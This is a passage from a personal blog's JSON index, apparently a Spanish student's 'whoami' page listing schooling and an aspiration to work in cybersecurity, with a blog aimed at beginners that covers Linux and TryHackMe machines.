TryhackMe.\nEstudios Primaria (2010-2015) Tengo el titulo de primaria.\nESO (2015-2020) Tengo el titulo de la ESO con una media de 7.\nSMX Tengo el primer año del ciclo medio de sistemas microinformaticos y redes (SMX) y actualmente estoy cursando el segundo año.\nAspiraciones Ciberseguridad La ciberseguridad es mi pasión, he decidido que quiero dedicarme a ello y por eso estoy empezando este largo camino desde abajo.\n","permalink":"https://b3nder0n.github.io/whoami/","summary":"Mi nombre es b3nder0n y me mola mucho la ciberseguridad. He creado este post para que a aquellos a los que tambien les apasione este mundo tengan un soporte para empezar, desde como personalizar Linux hasta resolucion de maquinas avanzadas en TryhackMe.\nEstudios Primaria (2010-2015) Tengo el titulo de primaria.\nESO (2015-2020) Tengo el titulo de la ESO con una media de 7.\nSMX Tengo el primer año del ciclo medio de sistemas microinformaticos y redes (SMX) y actualmente estoy cursando el segundo año.","title":"WHOAMI, ¿QUIEN SOY?"}]